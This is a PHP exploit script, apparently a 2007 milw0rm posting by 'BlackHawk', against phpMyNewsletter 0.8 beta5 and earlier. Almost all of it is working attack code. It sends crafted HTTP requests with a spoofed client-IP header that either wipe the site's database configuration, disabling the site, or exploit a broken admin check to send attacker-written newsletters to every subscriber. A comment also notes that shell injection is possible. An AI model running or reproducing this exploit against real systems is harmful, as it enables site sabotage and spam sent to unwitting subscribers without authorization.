#!/usr/bin/php -q -d short_open_tag=on
<?
echo "
phpMyNewsletter <= 0.8 (beta5) Multiple Vuln Exploit
by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>
Thanks to rgod for the php code and Marty for the Love

";
if ($argc<3) {
echo "Usage: php ".$argv[0]." Site AttackType Related
Host:          target server (ip/hostname)
Path:          path of phpMyNewsletter
AttackType:    1 - > Delete Config Value (Rude Attack - can't do anything after)
			   2 - > Send an Email to all of the subscribers (Do not alter anything)
Related:       1 - > None
               2 - > OneWordTitle TextOfYourChoice
                     Es:
                     php ".$argv[0]." localhost /myphpnl/ Newsletter_Hacked BlackHawk Got Your Newsletter
";
die;
}

/*
Attack N�1
vuln code is in index.php: the function to ceck the login is at line 79,
but the code to change the config file is at line 33..
if mq=off you can inject a shell into the file..

Attack N�2

vuln code is in send_mod.php at line 16:

if(!checkAdminAccess($conf->admin_pass, $form_pass))
     header("Location:index.php");
	 
this is not a protection, so we can send previously created newsletter..
but in the same file there is a function to add new-newsletters..
so here it is a perfect spam sender program..

BlackHawk <hawkgotyou@gmail.com>
*/
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$attack_type=$argv[3];
$port=80;
$proxy="";

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}


switch($attack_type)
{
case 1: //Config.php values delete
echo " - Executing Task..\r\n";
$data="file=1&db_host=hacked&db_login=hacked&db_pass=hacked&db_name=hacked&table_config=hacked";
$packet="POST ".$p."admin/index.php?op=saveGlobalconfig HTTP/1.0\r\n";
$packet.="CLIENT-IP: 999.999.999.999\r\n";//spoof
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
$packet.="Referer: http://".$host.$path."\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
echo " - All done.. ^_^\r\n";
break;

case 2: //Send NewsLetter
$title=$argv[4];
$txt='';
for ($i=5; $i<=$argc-1; $i++){
$txt.=" ".$argv[$i];
}
echo " - Executing Task 1 (Creating Newsletter)\r\n";
$data="subject=".urlencode($title.' - Send With BlackHawk Exploit -')."&message=".urlencode($txt.'<br><br> - Send With BlackHawk Exploit -')."&format=html&list_id=1";
$packet="POST ".$p."admin/send_mod.php HTTP/1.0\r\n";
$packet.="CLIENT-IP: 999.999.999.999\r\n";//spoof
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
$packet.="Referer: http://".$host.$path."\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
echo " - Retrieving MsgID..\r\n";
$temp= explode('Location: ', $html);
$x = explode("\n", $temp[1]);
$url_msgid=$x[0];
echo " - Sending The EMail..\r\n";

$packet="GET ".$p."admin/$url_msgid HTTP/1.0\r\n";
$packet.="CLIENT-IP: 999.999.999.999\r\n";//spoof
$packet.="Referer: http://".$host.$path."\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n";
echo $packet;
sendpacketii($packet);
echo " - Email Sent\r\n";
echo $html;
}
?>

# milw0rm.com [2007-04-05]
